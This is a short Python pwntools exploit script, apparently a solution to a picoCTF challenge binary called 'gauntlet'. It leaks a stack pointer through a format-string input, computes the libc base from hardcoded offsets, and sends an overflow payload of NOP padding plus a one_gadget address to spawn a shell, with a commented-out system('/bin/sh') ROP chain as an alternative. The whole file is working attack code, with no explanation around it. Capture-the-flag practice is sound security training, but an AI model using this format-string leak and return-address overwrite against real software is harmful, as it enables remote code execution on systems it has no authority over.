from pwn import *
elf = ELF('./gauntlet')

context.arch = 'amd64'

cyberedu = 'wily-courier.picoctf.net:64863'

ip, port = cyberedu.split(':')
port = int(port)
#gdb.attach(p, gdbscript="b * 0x40071C")

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

p.sendline(b"%2$p")
dest = p.recvline()
dest = int(dest, 16)

libc_offset = 0x3ed8d0
libc = dest - libc_offset

binsh = 0x1b3e9a + libc
system = 0x4f440 + libc

pop_rdi_ret = 0x8f989 + libc
ret = 0xc7c02 + libc

one_gadget = libc + 0x4f302

print(f"libc is at {hex(libc)} and {hex(binsh)} and {hex(system)} and {hex(pop_rdi_ret)} and {hex(ret)}")

#we're going to write shellcode in dest.

#104 + 8(s) + 8(rbp) + dest

payload = ( b"\x90"*120 +
            p64(one_gadget) 
          #  p64(binsh) + 
          #  p64(ret) +
          #  p64(system)
            )
            
p.sendline(payload)
          
p.interactive()
